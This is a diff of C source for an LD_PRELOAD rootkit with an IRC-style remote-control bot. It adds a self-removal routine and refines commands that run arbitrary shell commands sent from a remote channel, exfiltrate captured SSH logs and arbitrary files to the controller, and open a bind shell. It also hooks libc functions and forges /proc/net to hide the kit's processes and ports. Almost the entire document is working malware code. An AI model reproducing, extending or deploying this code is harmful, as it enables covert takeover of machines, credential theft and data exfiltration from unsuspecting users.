@@ -26,6 +26,30 @@ int is_hidden_port(int port)
     return r;
 }
 
+void kill_rk_procs(void);
+int kill_self(void)
+{
+    if(getuid() != 0) return -1;
+    HOOK(o_opendir,"opendir");
+    HOOK(o_readdir,"readdir");
+    HOOK(o_unlink,"unlink");
+    HOOK(o_rmdir,"rmdir");
+    DIR *dirp=o_opendir(INSTALL_DIR);
+    if(!dirp) return -1;
+    struct dirent *dir;
+    char path[256];
+    while((dir=o_readdir(dirp)) != NULL)
+    {
+        if(!strcmp(".\0",dir->d_name) || !strcmp("..\0",dir->d_name)) continue;
+        snprintf(path,sizeof(path),"%s/%s",INSTALL_DIR,dir->d_name);
+        if(o_unlink(path)<0) return -1;
+    }
+    if(o_rmdir(INSTALL_DIR)<0) return -1;
+    if(o_unlink(LDSP)<0) return -1;
+    kill_rk_procs();
+    return 0;
+}
+
 FILE *forge_procnet(const char *pathname)
 {
     HOOK(o_fopen,"fopen");
@@ -184,6 +208,7 @@ char *gcmdline()
 
 int is_bad_proc(const char *filename)
 {
+    if(strstr(cprocname(),"ssh") || strstr(filename,"ssh")) return 0;
     char fnm_proc[64];
     int i;
     for(i=0; i<sizeof(bad_bins)/sizeof(bad_bins[0]); i++)
@@ -195,28 +220,37 @@ int is_bad_proc(const char *filename)
     return 0;
 }
 
-void kill_rk_procs()
+void kill_rk_procs(void)
 {
     HOOK(o_opendir,"opendir");
     HOOK(o_readdir,"readdir");
     HOOK(o_xstat,"__xstat");
+
     DIR *dirp=o_opendir("/proc");
+    if(dirp == NULL)
+    {
+        (void) kill_self(); // cya
+        exit(0);
+    }
+
     struct dirent *dir;
     struct stat s_fstat;
+    int w=0;
     memset(&s_fstat,0,sizeof(stat));
-    if(dirp == NULL) exit(0); // IT'S ALL GONE TO HELLLLLl
+    
     char pp[512];
     while((dir=o_readdir(dirp)) != NULL)
     {
-        if(!strcmp(dir->d_name, ".\0") || !strcmp(dir->d_name, "/\0") ||  // we need to chase down an actual
-           !strcmp(dir->d_name, "net") || !strcmp(dir->d_name,"self") ||  // process id to see if we're running already.
+        if(!strcmp(dir->d_name, ".\0") || !strcmp(dir->d_name, "/\0") ||
+           !strcmp(dir->d_name, "net") || !strcmp(dir->d_name,"self") ||
            !strcmp(dir->d_name, "thread-self")) continue;
 
         snprintf(pp,sizeof(pp),"/proc/%s",dir->d_name);
         o_xstat(_STAT_VER,pp,&s_fstat);
-        if(s_fstat.st_gid==MGID) kill(atoi(dir->d_name),SIGTERM);
+        if(s_fstat.st_gid==MGID) { w=1; kill(atoi(dir->d_name),SIGTERM); }
     }
     closedir(dirp);
+    if(w) sleep(BPROC_WAIT); // if we've killed any rk processes, we wait for sockets to die completely
     return;
 }
 
@@ -225,11 +259,18 @@ int is_betrayed_alive(void)
     HOOK(o_opendir,"opendir");
     HOOK(o_readdir,"readdir");
     HOOK(o_xstat,"__xstat");
+
     DIR *dirp=o_opendir("/proc");
+    if(dirp == NULL)
+    {
+        if(getuid() == 0) (void) kill_self();
+        exit(0);
+    }
+
     struct dirent *dir;
     struct stat s_fstat;
     memset(&s_fstat,0,sizeof(stat));
-    if(dirp == NULL) exit(0); // IT'S ALL GONE TO HELLLLLl
+    
     char pp[512];
     while((dir=o_readdir(dirp)) != NULL)
     {
@@ -377,7 +418,6 @@ int setup_connection(void)
 
     int rc=getaddrinfo(HOST,PORT,&hints,&res);
     if(rc<0) exit(0);
-    HOOK(o_socket,"socket");
     s=socket(res->ai_family,res->ai_socktype,res->ai_protocol);
     if(s<0) goto fail;
     if(connect(s,res->ai_addr,res->ai_addrlen)<0) goto fail;
@@ -400,12 +440,16 @@ void populate_chrs(char *line, char **pfix, char **uname, char **cmd, char **lar
     return;
 }
 
-#define CMSG(buf) send_message(sockfd,CHANNEL,buf); sleep(SEND_TOUT);
+#define CMSG(buf) send_message(sockfd,CHANNEL,buf);
+int sfd,rc,scli;
+void commit_btermicide(void)
+{
+    shutdown(sfd,SHUT_RDWR);
+    close(sfd);
+}
 
 int create_bind_shell(int port)
 {
-    int sfd, rc, slen, scli;
-    HOOK(o_socket,"socket");
     sfd=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
     if(sfd<0) return -1;
 
@@ -425,10 +469,11 @@ int create_bind_shell(int port)
         rc=listen(sfd,5);
         if(rc != 0) exit(0);
 
+        signal(SIGTERM,(sighandler_t)commit_btermicide);
         while(1)
         {
-            slen=sizeof(them);
-            scli=accept(sfd, (struct sockaddr *)&them, (socklen_t *)&slen);
+            socklen_t slen=sizeof(them);
+            scli=accept(sfd, (struct sockaddr *)&them, &slen);
             if(scli<0) exit(0);
 
             int x;
@@ -447,7 +492,7 @@ int create_bind_shell(int port)
 void betrayer(int s)
 {
     FILE *fp;
-    char line[512];
+    char line[512],fbuf[128],*ucmd;
     HOOK(o_fopen,"fopen");
     while(1)
     {
@@ -469,54 +514,54 @@ void betrayer(int s)
         /* once we know that we more or less have a solid connection, we can start doing stuff. */
         if(have_ponged)
         {
-            char fbuf[128];
-            char *ucmd = get_argument(line,3);
-            
-            /* reads outgoing ssh logfile and sends to channel */
-            if(!strcmp(largument,"!ssh_logs"))
-            {
-                fp=fopen(SSH_LOGS,"r");
-                if(!fp) continue;
-                while(fgets(fbuf,sizeof(fbuf),fp) != NULL) CMSG(fbuf);
-                fclose(fp);
-            }
-
-            /* allows you to execute commands from the channel.
-             * sends the output of said command(s) to the channel so you
-             * can see what's going on. */
-            if(!strncmp(largument,"!sh",strlen("!sh")))
-            {
-                char *shcmd=strdup(largument),cmd[128];
-                shcmd+=4;
-                snprintf(cmd,sizeof(cmd),"%s 2>/dev/null",shcmd); /* we don't want errors popping up randomly. */
-                fp=popen(shcmd,"r");                              /* that would be weird... */
-                if(!fp) continue;
-                while(fgets(fbuf,sizeof(fbuf),fp) != NULL) CMSG(fbuf);
-                pclose(fp);
-            }
-
+            ucmd = get_argument(line,3);
             /* it is mandatory that these operations have another argument to go along
              * with them. */
             if(ucmd[0] != '\0')
             {
-                /* read file contents. send to channel line at a time, a second inbetween. */
-                if(!strncmp(largument,"!read_file",strlen("!read_file")))
+                /* reads outgoing ssh logfile and sends to channel */
+                if(!strncmp(largument,"!ssh_logs",strlen("!ssh_logs")) && !strcmp(NICK,ucmd))
                 {
-                    char *file=ucmd;
-                    fp=fopen(file,"r");
+                    fp=o_fopen(SSH_LOGS,"r");
                     if(!fp) continue;
-                    while(fgets(fbuf,sizeof(fbuf),fp) != NULL) CMSG(fbuf);
+                    while(fgets(fbuf,sizeof(fbuf),fp) != NULL)
+                    {
+                        CMSG(fbuf);
+                        sleep(SEND_TOUT);
+                    }
                     fclose(fp);
                 }
 
-                /* i really like having a bind shell in this. but as of right now, it's not hidden from
-                 * netstat or anything like that. the processes are of course hidden but not the connections
-                 * themselves.
-                 * i think i can fix this by writing said port to a file when the bind is made, and have
-                 * forge_proc_net read the file for ports to hide. */
-                if(!strncmp(largument,"!bind",strlen("!bind")))
+                /* allows you to execute commands from the channel.
+                 * sends the output of said command(s) to the channel so you
+                 * can see what's going on. */
+                if(!strncmp(largument,"!sh",strlen("!sh")) && !strcmp(NICK,ucmd))
                 {
-                    int port=atoi(ucmd);
+                    char *shcmd=strdup(largument),cmd[128];
+                    shcmd+=4+strlen(NICK)+1;
+                    snprintf(cmd,sizeof(cmd),"%s 2>/dev/null",shcmd); /* we don't want errors popping up randomly. */
+                    fp=popen(shcmd,"r");                              /* that would be weird... */
+                    if(!fp) continue;
+                    while(fgets(fbuf,sizeof(fbuf),fp) != NULL) CMSG(fbuf);
+                    pclose(fp);
+                }
+
+                if(!strncmp(largument,"!read_file",strlen("!read_file")) && !strcmp(NICK,ucmd))
+                {
+                    char *file=get_argument(line,4);
+                    fp=o_fopen(file,"r");
+                    if(!fp) continue;
+                    while(fgets(fbuf,sizeof(fbuf),fp) != NULL)
+                    {
+                        CMSG(fbuf);
+                        sleep(SEND_TOUT);
+                    }
+                    fclose(fp);
+                }
+
+                if(!strncmp(largument,"!bind",strlen("!bind")) && !strcmp(NICK,ucmd))
+                {
+                    int port=atoi(get_argument(line,4));
                     if(!port) continue;
                     if(create_bind_shell(port)<0) continue;
                     else{
@@ -529,18 +574,15 @@ void betrayer(int s)
                 /* i'm adding persistent ld.so.preload. soon.
                  * when i add it, make an exception so we're able to actually uninstall the kit 
                  * when we want to. */
-                if(!strncmp(largument,"!kill",strlen("!kill")) && !strcmp(NICK,ucmd))
+                if(!strncmp(largument,"!kill",strlen("!kill")) && (!strcmp(NICK,ucmd) || !strcmp("all",ucmd)))
                 {
-                    CMSG("goodbye...");
-                    close(s);
-                    HOOK(o_unlink,"unlink");
-                    o_unlink(LDSP);
-                    goto killed_off;
+                    if(kill_self()<0)
+                    {
+                        CMSG("something went wrong killing myself.");
+                        continue;
+                    }
                 }
             }
         }
     }
-killed_off:
-    have_ponged=0;
-    exit(0);
 }
